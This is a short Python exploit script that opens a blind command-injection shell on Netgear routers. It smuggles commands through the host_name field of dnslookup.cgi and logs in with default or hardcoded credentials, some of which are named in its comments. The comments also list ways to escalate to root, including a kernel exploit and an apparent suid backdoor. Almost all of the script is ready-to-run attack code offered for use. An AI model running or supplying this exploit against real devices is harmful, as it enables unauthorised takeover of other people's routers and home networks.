#!/usr/bin/python

#Provides access to default user account, privileges can be easily elevated by using either:
# - a kernel exploit (ex. memodipper was tested and it worked)
# - by executing /bin/bd (suid backdoor present on SOME but not all versions)
# - by manipulating the httpd config files to trick the root user into executing your code (separate advisory will be released soon)
 
#Pozdrawiam: Kornela, Komara i Sknerusa

import sys
import requests
 
#You can change these credentials to ex. Gearguy/Geardog or Guest/Guest which are hardcoded on SOME firmware versions
#These routers DO NOT support telnet/ssh access so you can use this exploit to access the shell if you want to
 
login = 'admin'
password = 'password'
 
def main():
    if len(sys.argv) < 2:
        print "./netgearpwn_2.py <router ip>"
        return
    spawnShell()

def execute(cmd): #Escaping basic sanitization
    requests.post("http://" + sys.argv[1] + "/dnslookup.cgi", data={'host_name':"www.google.com; " + cmd, 'lookup': "Lookup"}, auth=(login, password))
    return

def spawnShell():
    print "Dropping a shell-like environment (blind OS injection)"
    print "To test it type 'reboot'"
    while True:
        cmd = raw_input("[blind $] ")
        execute(cmd)
 
if __name__ == "__main__":
    main()

#2017-02-25 by SivertPL
#Tak, to ja.